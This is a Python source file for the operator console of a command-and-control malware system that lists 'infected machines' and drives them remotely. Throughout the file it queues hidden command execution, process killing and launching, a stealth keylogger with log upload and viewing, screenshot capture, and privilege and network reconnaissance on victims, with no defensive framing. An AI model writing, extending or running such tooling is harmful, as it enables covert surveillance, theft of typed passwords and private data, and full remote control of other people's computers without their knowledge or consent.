import requests
import json
import time
from datetime import datetime
from config import HOST

class Controller:
    def __init__(self):
        self.server_url = HOST
    
    def get_connected_clients(self):
        try:
            print(f"[+] Fetching connected clients from {self.server_url}")
            response = requests.get(f"{self.server_url}/admin/clients", timeout=10)
            
            if response.status_code == 200:
                data = response.json()
                clients = data.get('clients', [])
                
                print(f"[+] ✅ Successfully retrieved {len(clients)} clients")
                return clients


            else:
                print(f"[-] ❌ Server returned {response.status_code}")
                print(f"[-] Response: {response.text}")
                return []
                
        except requests.exceptions.ConnectionError:
            print(f"[-] ❌ Cannot connect to C2 server at {self.server_url}")
            return []

        except Exception as e:
            print(f"[-] ❌ Error fetching clients: {e}")
            return []
    
    
    
    
    def display_clients(self, clients):
        if not clients:
            print("[-] No clients connected")
            return
        
        
        print("\n" + "="*80)
        print("INFECTED MACHINES")
        print("="*80)
        

        online_count = 0
        for i, client in enumerate(clients, 1):
            status = "🟢 ONLINE" if client.get('online') else "🔴 OFFLINE"
            if client.get('online'):
                online_count += 1
            
            system_info = client.get('system_info', {})
            platform_name = system_info.get('platform', 'Unknown')
            hostname = system_info.get('hostname', 'Unknown')
            username = system_info.get('username', 'Unknown')
            
            last_seen = datetime.fromtimestamp(client.get('last_seen', 0))
            uptime = time.strftime('%H:%M:%S', time.gmtime(client.get('uptime_seconds', 0)))
            
            print(f"\n{i}. {client['client_id']}")
            print(f"   Status: {status}")
            print(f"   System: {platform_name} | {hostname} | {username}")
            print(f"   IP: {client.get('ip', 'Unknown')}")
            print(f"   Last Seen: {last_seen}")
            print(f"   Uptime: {uptime}")
            print(f"   Check-ins: {client.get('checkin_count', 0)}")
            print("-" * 80)
        
        print(f"\n SUMMARY: {online_count}/{len(clients)} clients online")
  
  
  
    
    def get_server_status(self):
        try:
            response = requests.get(f"{self.server_url}/admin/status", timeout=5)
            if response.status_code == 200:
                return response.json()
            return {}
        except:
            return {}
    
    
    def send_process_command(self, client_id, action, data=None):
        try:
            print(f"[+] Sending command to {client_id}: {action}")

            
            response = requests.post(
                f"{self.server_url}/admin/process/{client_id}",
                json={
                    "action": action,
                    "data": data or {}
                },
                timeout = 40
            )
            
            
            if response.status_code == 200:
                result = response.json()
                command_id = result.get("command_id")
                
                if command_id:
                    print(f"[+] Command queued successfully. Waiting for result...")
                    for attempt in range(12):
                        time.sleep(5)
                        
                        result_response = requests.get(
                            f"{self.server_url}/admin/command_result/{command_id}",
                            timeout = 5
                        )
                        
                        if result_response.status_code == 200:
                            result_data = result_response.json()
                            return result_data.get("result")
                        elif attempt == 11:
                            print("[-] Timeout waiting for command result")
                            return {"error": "Timeout waiting for command execution"}
                
                
                return result
            else:
                print(f"[-] Command failed: {response.status_code} - {response.text}")
                return {"error" : f'Server returned {response.status_code}'}
        
        
        except requests.exceptions.ConnectionError:
            print(f"[-] Cannot connect to server")
            return {"error": "Cannot connect to server"}
        except Exception as e:
            print(f"[-] Error sending command: {e}")
            return {"error": f"Command failed: {e}"}
    
    
    
    
    def process_management_menu(self, client_id):
        while True:
            print("\n" + "="*50)
            print(f"PROCESS MANAGEMENT - Client: {client_id}")
            print("="*50)
            print("1. 📋 List all processes")
            print("2. 🌳 View process tree") 
            print("3. 🔍 Get process details")
            print("4. 💀 Kill process")
            print("5. 🚀 Start process")
            print("6. ⚡Execute command")
            print("7. 💻 Get system info")
            print("8. ⌨️  Keylogger Management")
            print("9. 📸 Screenshot Management")
            print("10. 🔙 Back to main menu")
            
            
            choice = input("\nSelect option(1-8): ").strip()
            
            if choice == "1":
                self.handle_list_processes(client_id)
            elif choice == "2":
                self.handle_process_tree(client_id)
            elif choice == "3":
                self.handle_process_details(client_id)
            elif choice == "4":
                self.handle_kill_process(client_id)
            elif choice == "5":
                self.handle_start_process(client_id)
            elif choice == "6":
                self.handle_execute_command(client_id)
            elif choice == "7":
                self.handle_detailed_system_info(client_id)
            elif choice == "8":
                self.keylogger_management_menu(client_id)
            elif choice == "9":
                self.handle_take_screenshot(client_id, multi=False)
            elif choice == "10":
                break
            else:
                print("[-] Invalid option")
                
                
    def handle_list_processes(self, client_id):
        print("\n[+] Fetching process list...")
        result = self.send_process_command(client_id, "get_all_processes")
        
        if isinstance(result, list):
            processes = result
            print(f"\n[+] Found {len(processes)} processes: ")
            print("-" * 100)
            print(f"{'PID':<8} {'Name':<20} {'User':<15} {'CPU%':<6} {'Memory%':<8} {'Status':<10}")
            print("-" * 100)
            
            for proc in processes[:50]:
                pid = proc.get('pid', 'N/A')
                name = proc.get('name', 'N/A')[:18]
                username = proc.get('username', 'N/A')[:13]
                cpu = proc.get('cpu_percent', 'N/A')
                memory = proc.get('memory_percent', 'N/A')
                status = proc.get('status', 'N/A')[:8]
                
                print(f"{pid:<8} {name:<20} {username:<15} {cpu:<6} {memory:<8} {status:<10}")
            
            if len(processes) > 50:
                print(f"\n[!] Showing 50 out of {len(processes)} processes")
        
        elif isinstance(result, dict) and result.get("error"):
            error = result.get('error', 'Unknown error')
            print(f"[-] Failed to get processes: {error}")
        else:
            print(f"[-] Unexpected response format: {result}")
        
        
    
    def handle_process_tree(self, client_id):
        print("\n[+] Fetching process tree...")
        result = self.send_process_command(client_id, "get_process_tree")
        
        if isinstance(result, list):
            self.display_process_tree(result, level=0)
        elif isinstance(result, dict) and result.get("error"):
            error = result.get("error", "Unknown error")
            print(f"[-] Failed to get process tree: {error}")
        else:
            print(f"[-] Unexpected response format: {result}")
  
  
    
    def display_process_tree(self, tree, level=0):
        if not tree:
            print("  (No processes found)")
            return
            
        indent = "  " * level
        
        if isinstance(tree, list):
            for node in tree:
                self.display_process_tree(node, level)
        
        elif isinstance(tree, dict):
            pid = tree.get("pid", "N/A")
            name = tree.get("name", "N/A")
            username = tree.get("username", "N/A")
            
            print(f"{indent}├─ {name} (PID: {pid}, User: {username})")
            
            children = tree.get('children', [])
            for child in children:
                self.display_process_tree(child, level + 1)
    
    
    
    def handle_process_details(self, client_id):
        pid = input("Enter PID: ").strip()
        
        if pid.isdigit():
            print(f"\n[+] Getting details for PID {pid}...")
            result = self.send_process_command(client_id, "get_process_details", {"pid": int(pid)})
            
            
            if result and not result.get("error"):
                print("\n" + "="*50)
                print(f"PROCESS DETAILS - PID: {pid}")
                print("=" * 50)
                
                
                keys_to_display = ['name', 'status', 'username', 'ppid', 'cpu_percent', 'memory_percent', 'num_threads', 'exe', 'command_line']
                
                for key in keys_to_display:
                    value = result.get(key, "N/A")
                    if key == "command_line" and isinstance(value, list):
                        value = ' '.join(value)
                    print(f"{key.replace('_', ' ').title():<15}: {value}")
                
                
            #EXTRA
                if 'connections' in result and result['connections']:
                    print(f"\nNetwork Connections: {len(result['connections'])}")
                if 'open_files' in result and result['open_files']:
                    print(f"Open Files: {len(result['open_files'])}")
            
            else:
                error = result.get("error", "Unknown error") if result else 'No response'
                print(f"[-] Failed to get process details: {error}")
        
        else:
            print("[-] Invalid PID")
    
    
    def handle_kill_process(self, client_id):
        pid = input("Enter PID to kill: ").strip()
        if pid.isdigit():
            confirm = input(f"Are you sure you want to kill process {pid}? (y/n): ").strip().lower()
            if confirm == 'y':
                print(f"\n[+] Killing process {pid}...")
                result = self.send_process_command(client_id, "kill_process", {"pid": int(pid)})
                
                if result and result.get('success'):
                    print(f"[+] {result.get('message', 'Process killed successfully')}")
                else:
                    error = result.get('error', 'Unknown error') if result else 'No response'
                    print(f"[-] Failed to kill process: {error}")
            else:
                print("[!] Operation cancelled")
        else:
            print("[-] Invalid PID")
    

    def handle_start_process(self, client_id):
        command = input("Enter command to start: ").strip()
        if command:
            hidden = input("Run hidden? (y/n): ").strip().lower() == 'y'
            
            print(f"\n[+] Starting process: {command}")
            result = self.send_process_command(client_id, "start_process", {
                "command": command.split(),
                "hidden": hidden
            })
            
            if result and result.get('success'):
                pid = result.get('pid', 'Unknown')
                print(f"[+] Process started successfully (PID: {pid})")
                print(f"    Message: {result.get('message', '')}")
            else:
                error = result.get('error', 'Unknown error') if result else 'No response'
                print(f"[-] Failed to start process: {error}")
        else:
            print("[-] No command provided")
            
    
    def handle_execute_command(self, client_id):
        command = input("Enter command to execute: ").strip()
        if command:
            hidden = input("Run hidden? (y/n): ").strip().lower() == 'y'
            working_dir = input("Working directory (press Enter for current): ").strip()
            working_dir = working_dir if working_dir else None
            
            
            print(f"\n[+] Executing command: {command}")
            result = self.send_process_command(client_id, "execute_command", {
                "command": command,
                "hidden": hidden,
                "working_dir": working_dir
            })
            
            if result and result.get('success'):
                print(f"[+] Command executed successfully!")
                print(f" Exit Code: {result.get('exit_code', 'N/A')}")
                

                stdout = result.get('stdout', '').strip()
                stderr = result.get('stderr', '').strip()
                
                if stdout:
                    print(f" Output:\n{stdout}")
                if stderr:
                    print(f" Errors:\n{stderr}")
                    
                print(f" Message: {result.get('message', '')}")
            else:
                error = result.get('error', 'Unknown error') if result else 'No response'
                print(f"[-] Failed to execute command: {error}")
        else:
            print("[-] No command provided")
    
    
    
    
    
    def handle_system_info(self, client_id):
        print("\n[+] Fetching system information...")
        result = self.send_process_command(client_id, "get_system_info")
        
        if result and not result.get('error'):
            print("\n" + "="*50)
            print("SYSTEM INFORMATION")
            print("="*50)
            
            #Display basic system info
            basic_info = [
                'platform', 'hostname', 'architecture', 'kernel', 'boot_time'
            ]
            
            for key in basic_info:
                value = result.get(key, 'N/A')
                print(f"{key.replace('_', ' ').title():<15}: {value}")
            
            #Display CPU info
            if 'cpu' in result:
                cpu = result['cpu']
                print(f"\nCPU Information:")
                print(f"  Model: {cpu.get('model', 'N/A')}")
                print(f"  Cores: {cpu.get('physical_cores', 'N/A')} physical, {cpu.get('logical_cores', 'N/A')} logical")
                if 'cpu_usage' in cpu:
                    usage = cpu['cpu_usage']
                    if isinstance(usage, list):
                        print(f"  CPU Usage: {len(usage)} cores")
                    else:
                        print(f"  CPU Usage: {usage}%")
            
            #Display Memory info
            if 'memory' in result:
                memory = result['memory']
                total_gb = memory.get('total', 0) / (1024**3)
                available_gb = memory.get('available', 0) / (1024**3)
                percent = memory.get('percent', 0)
                
                print(f"\nMemory Information:")
                print(f"  Total: {total_gb:.2f} GB")
                print(f"  Available: {available_gb:.2f} GB")
                print(f"  Usage: {percent}%")
                
        else:
            error = result.get('error', 'Unknown error') if result else 'No response'
            print(f"[-] Failed to get system info: {error}")
    
    def interactive_mode(self):
        print("\n" + "="*50)
        print("C2 CONTROLLER - INFECTED MACHINES LIST")
        print("="*50)
        

        status = self.get_server_status()
        if status:
            print(f"Server: {self.server_url}")
            print(f"🟢 Status: {status.get('status', 'unknown')}")
            print(f" Total Clients: {status.get('total_clients', 0)}")
            print(f"🟢 Online Now: {status.get('online_clients', 0)}")
        else:
            print(f"Server: {self.server_url}")
            print("🔴 Cannot connect to server")
        
        while True:
            print("\n" + "="*40)
            print("Available Commands:")
            print("1. Refresh client list")
            print("2. Server status") 
            print("3. Manage client processes")
            print("4. Exit")
            print("="*40)
            
            choice = input("\nSelect option (1-4): ").strip()
            
            if choice == "1":
                print("\n[+] Fetching client list...")
                clients = self.get_connected_clients()
                self.display_clients(clients)
                
            elif choice == "2":
                status = self.get_server_status()
                if status:
                    print(f"\n SERVER STATUS:")
                    print(f"  Status: {status.get('status', 'unknown')}")
                    print(f"  Total Clients: {status.get('total_clients', 0)}")
                    print(f"  Online Clients: {status.get('online_clients', 0)}")
                    uptime = time.strftime('%H:%M:%S', time.gmtime(status.get('uptime_seconds', 0)))
                    print(f"  Server Uptime: {uptime}")
                else:
                    print("[-] Cannot get server status")
                    
            elif choice == "3":
                clients = self.get_connected_clients()
                online_clients = [c for c in clients if c.get("online")]
                
                if online_clients:
                    print("\n🟢 Online Clients:")
                    
                    for i, client in enumerate(online_clients, 1):
                        system_info = client.get("system_info", {})
                        hostname = system_info.get("hostname", "Unknown")
                        platform_name = system_info.get("platform", "Unknown")
                        print(f"{i}. {client['client_id']} - {hostname} ({platform_name})")
                    
                    
                    client_choice = input("\nSelect client (number): ").strip()
                    if client_choice.isdigit() and 1 <= int(client_choice) <= len(online_clients):
                        selected_client = online_clients[int(client_choice) - 1]
                        self.process_management_menu(selected_client['client_id'])
                    
                    else:
                        print("[-] Invalid client selection")
                else:
                    print("[-] No online clients available")
            elif choice == "4":
                print("[+] Exiting controller")
                break
            else:
                print("[-] Invalid option")
                
    def keylogger_management_menu(self, client_id):
        while True:
            print("\n" + "="*50)
            print(f"KEYLOGGER MANAGEMENT - Client: {client_id}")
            print("="*50)
            print("1. 🚀 Start Keylogger")
            print("2. 🛑 Stop Keylogger")
            print("3. 📊 Get Keylogger Status")
            print("4. 📨 Force Log Upload")
            print("5. 📝 View Captured Keylogs")
            print("6. 🔙 Back to process menu")
            
            choice = input("\nSelect option(1-5): ").strip()
            
            if choice == "1":
                self.handle_start_keylogger(client_id)
            elif choice == "2":
                self.handle_stop_keylogger(client_id)
            elif choice == "3":
                self.handle_keylogger_status(client_id)
            elif choice == "4":
                self.handle_force_upload(client_id)
            elif choice == "5":
                self.view_keylogs(client_id)
            elif choice == "6":
                break
            else:
                print("[-] Invalid option")
    
    def handle_start_keylogger(self, client_id):
        stealth = input("Enable stealth mode? (y/n, default=y): ").strip().lower()
        stealth_mode = stealth != 'n'
        
        print(f"\n[+] Starting keylogger on {client_id}...")
        result = self.send_process_command(client_id, "start_keylogger", {
            "stealth": stealth_mode
        })
        
        if result and result.get('success'):
            print(f"[+] Keylogger started successfully!")
            print(f"    Log file: {result.get('log_file', 'Unknown')}")
            print(f"    Stealth mode: {result.get('stealth_mode', 'Unknown')}")
        else:
            error = result.get('error', 'Unknown error') if result else 'No response'
            print(f"[-] Failed to start keylogger: {error}")
    
    def handle_stop_keylogger(self, client_id):
        confirm = input("Are you sure you want to stop the keylogger? (y/n): ").strip().lower()
        if confirm == 'y':
            print(f"\n[+] Stopping keylogger on {client_id}...")
            result = self.send_process_command(client_id, "stop_keylogger")
            
            if result and result.get('success'):
                print(f"[+] Keylogger stopped successfully!")
                print(f"    Message: {result.get('message', '')}")
            else:
                error = result.get('error', 'Unknown error') if result else 'No response'
                print(f"[-] Failed to stop keylogger: {error}")
        else:
            print("[!] Operation cancelled")
    
    def handle_keylogger_status(self, client_id):
        print(f"\n[+] Getting keylogger status for {client_id}...")
        result = self.send_process_command(client_id, "get_keylogger_status")
        
        if result and not result.get('error'):
            print("\n" + "="*50)
            print("KEYLOGGER STATUS")
            print("="*50)
            
            status_info = [
                ('Running', 'running'),
                ('Stealth Mode', 'stealth_mode'),
                ('Buffered Keystrokes', 'buffered_keystrokes'),
                ('Log File Size', 'log_file_size'),
                ('Log File Path', 'log_file_path'),
                ('Archived Logs', 'archived_logs')
            ]
            
            for display_name, key in status_info:
                value = result.get(key, 'N/A')
                if key == 'log_file_size' and isinstance(value, (int, float)):
                    value = f"{value / 1024:.2f} KB"
                print(f"{display_name:<20}: {value}")
                
        else:
            error = result.get('error', 'Unknown error') if result else 'No response'
            print(f"[-] Failed to get keylogger status: {error}")
    
    def handle_force_upload(self, client_id):
        print(f"\n[+] Forcing keylog upload for {client_id}...")
        result = self.send_process_command(client_id, "get_keylog_data")
        
        if result and not result.get('error'):
            print(f"[+] {result.get('message', 'Keylog data sent to server')}")
        else:
            error = result.get('error', 'Unknown error') if result else 'No response'
            print(f"[-] Failed to force upload: {error}")


    
    def view_keylogs(self, client_id):
        
        try:
            print(f"\n[+] Fetching recent keylogs for {client_id}...")
            response = requests.get(f"{self.server_url}/admin/keylogs/{client_id}", timeout=10)
            
            if response.status_code == 200:
                keylogs = response.json().get('keylogs', [])
                
                if keylogs:
                    print(f"\n[+] Found {len(keylogs)} recent keylogs:")
                    print("-" * 80)
                    
                    for log in keylogs[:20]:  # Afficher les 20 premiers
                        timestamp = log.get('timestamp', 'Unknown')
                        window = log.get('window', 'Unknown')[:30]
                        keystroke = log.get('keystroke', 'Unknown')
                        
                        # Formater le timestamp
                        try:
                            dt = datetime.fromisoformat(timestamp.replace('Z', '+00:00'))
                            time_str = dt.strftime("%H:%M:%S")
                        except:
                            time_str = timestamp
                        
                        print(f"[{time_str}] {window}: {keystroke}")
                    
                    if len(keylogs) > 20:
                        print(f"\n[!] Showing 20 out of {len(keylogs)} keylogs")
                else:
                    print("[-] No keylogs found for this client")
            else:
                print(f"[-] Failed to fetch keylogs: {response.status_code}")
                
        except Exception as e:
            print(f"[-] Error fetching keylogs: {e}")
            
    def screenshot_management_menu(self, client_id):
        while True:
            print("\n" + "="*50)
            print(f"SCREENSHOT MANAGEMENT - Client: {client_id}")
            print("="*50)
            print("1. 📷 Take Single Screenshot")
            print("3. 🔙 Back to process menu")
            
            choice = input("\nSelect option(1-4): ").strip()
            
            if choice == "1":
                self.handle_take_screenshot(client_id, multi=False)
            elif choice == "2":
                self.handle_take_screenshot(client_id, multi=True)
            elif choice == "4":
                break
            else:
                print("[-] Invalid option")
    
    def handle_take_screenshot(self, client_id, multi=False):
        
        quality = input("Quality (30-95, default=65): ").strip()
        quality = int(quality) if quality.isdigit() else 65
        
        action = "take_screenshot"
        data = {
            "quality": quality,
            "multi_display": multi
        }
        
        print(f"\n[+] Taking {'multi-display ' if multi else ''}screenshot...")
        result = self.send_process_command(client_id, action, data)
        
        if result and result.get('success'):
            print(f"[+] Screenshot captured successfully!")
            print(f"    Size: {result.get('width', 'N/A')}x{result.get('height', 'N/A')}")
            print(f"    File size: {result.get('size_kb', 'N/A')}KB")
            print(f"    Quality: {result.get('quality', 'N/A')}")
            
            # Option pour sauvegarder l'image
            save = input("Save screenshot to file? (y/n): ").strip().lower()
            if save == 'y':
                self.save_screenshot_to_file(result, client_id)
        else:
            error = result.get('error', 'Unknown error') if result else 'No response'
            print(f"[-]Screenshot failed: {error}")
    
    
    def save_screenshot_to_file(self, screenshot_data, client_id):
        
        try:
            import base64
            from datetime import datetime
            
            timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
            filename = f"screenshot_{client_id}_{timestamp}.jpg"
            
            image_data = screenshot_data.get('data')
            if image_data:
                with open(filename, 'wb') as f:
                    f.write(base64.b64decode(image_data))
                print(f"[+] Screenshot saved as: {filename}")
            else:
                print("[-] No image data to save")
        except Exception as e:
            print(f"[-] Error saving screenshot: {e}")
        
        
    def handle_detailed_system_info(self, client_id):
        
        print("\n[+] Getting detailed system information...")
        
        # Menu pour choisir le type d'info
        print("\n📊 Detailed System Info Options:")
        print("1. 🖥️  Full System Overview")
        print("2. 💻 Operating System Details")
        print("3. 🔧 Architecture Information")
        print("4. 👤 User Information")
        print("5. 🛡️  Privileges Information")
        print("6. 🌐 Network Information")
        
        choice = input("\nSelect info type (1-6): ").strip()
        
        actions = {
            "1": "get_detailed_system_info",
            "2": "get_os_info", 
            "3": "get_architecture_info",
            "4": "get_user_info",
            "5": "get_privileges_info",
            "6": "get_network_info"
        }
        
        if choice in actions:
            result = self.send_process_command(client_id, actions[choice])
            self.display_detailed_system_info(result, actions[choice])
        else:
            print("[-] Invalid option")

    def display_detailed_system_info(self, system_data, info_type):
        
        if not system_data or system_data.get("error"):
            error = system_data.get('error', 'Unknown error') if system_data else 'No response'
            print(f"[-] Failed to get system info: {error}")
            return
        
        print("\n" + "="*60)
        print("🖥️  DETAILED SYSTEM INFORMATION")
        print("="*60)
        
        if info_type == "get_detailed_system_info":
            # Affichage complet
            self._display_os_info(system_data.get('operating_system', {}))
            self._display_architecture_info(system_data.get('architecture', {}))
            self._display_user_info(system_data.get('user', {}))
            self._display_privileges_info(system_data.get('privileges', {}))
            self._display_network_info(system_data.get('network', {}))
            
        elif info_type == "get_os_info":
            self._display_os_info(system_data.get('operating_system', {}))
            
        elif info_type == "get_architecture_info":
            self._display_architecture_info(system_data.get('architecture', {}))
            
        elif info_type == "get_user_info":
            self._display_user_info(system_data.get('user', {}))
            
        elif info_type == "get_privileges_info":
            self._display_privileges_info(system_data.get('privileges', {}))
            
        elif info_type == "get_network_info":
            self._display_network_info(system_data.get('network', {}))
    
    def _display_os_info(self, os_info):
        print("\n💻 OPERATING SYSTEM")
        print("-" * 40)
        for key, value in os_info.items():
            print(f"{key.replace('_', ' ').title():<20}: {value}")
    
    def _display_architecture_info(self, arch_info):
        print("\n🔧 ARCHITECTURE")
        print("-" * 40)
        for key, value in arch_info.items():
            print(f"{key.replace('_', ' ').title():<20}: {value}")
    
    def _display_user_info(self, user_info):
        print("\n👤 USER INFORMATION")
        print("-" * 40)
        for key, value in user_info.items():
            print(f"{key.replace('_', ' ').title():<20}: {value}")
    
    def _display_privileges_info(self, priv_info):
        print("\n🛡️  PRIVILEGES")
        print("-" * 40)
        for key, value in priv_info.items():
            print(f"{key.replace('_', ' ').title():<20}: {value}")
    
    def _display_network_info(self, net_info):
        print("\n🌐 NETWORK INFORMATION")
        print("-" * 40)
        for key, value in net_info.items():
            if isinstance(value, list):
                print(f"{key.replace('_', ' ').title():<20}:")
                for item in value:
                    print(f"  - {item}")
            else:
                print(f"{key.replace('_', ' ').title():<20}: {value}")
        
if __name__ == "__main__":
    controller = Controller()
    controller.interactive_mode()